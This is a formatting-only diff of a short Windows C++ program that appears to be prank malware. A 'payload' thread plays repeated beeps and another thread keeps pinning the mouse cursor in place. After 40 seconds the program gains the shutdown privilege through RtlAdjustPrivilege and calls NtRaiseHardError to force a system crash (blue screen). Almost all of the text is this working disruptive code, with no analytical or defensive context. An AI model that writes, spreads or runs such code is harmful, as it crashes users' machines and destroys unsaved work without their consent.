@@ -8,8 +8,6 @@ void Sleep(
 	DWORD dwMilliseconds
 );
 
-
-
 EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(
 	ULONG    Privilege,
 	BOOLEAN  Enable,
@@ -25,9 +23,6 @@ EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus,
 	PULONG Response
 	);
 
-
-
-
 void WarpCursor() {
 POINT cursor;
 	while (true) {
@@ -35,7 +30,7 @@ POINT cursor;
 	Sleep(1'000);
 	SetCursorPos(cursor.x ,cursor.y);
 	}
-	}
+}
 
 
 void payload() {
@@ -45,7 +40,6 @@ void payload() {
 		MessageBeep(MB_ICONINFORMATION);
 	}
 }
-
 
 int main() {
 	BOOLEAN bl;
@@ -57,12 +51,12 @@ int main() {
 	std::thread t1 (payload);
 	std::thread t2(WarpCursor);
 
-		Sleep(40'000);
+	Sleep(40'000);
 		RtlAdjustPrivilege(19, true, false, &bl);
 		MessageBeep(MB_ICONINFORMATION);
 		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
 
-		t1.join();
-		t2.join();
+	t1.join();
+	t2.join();
 	return 0;
 }
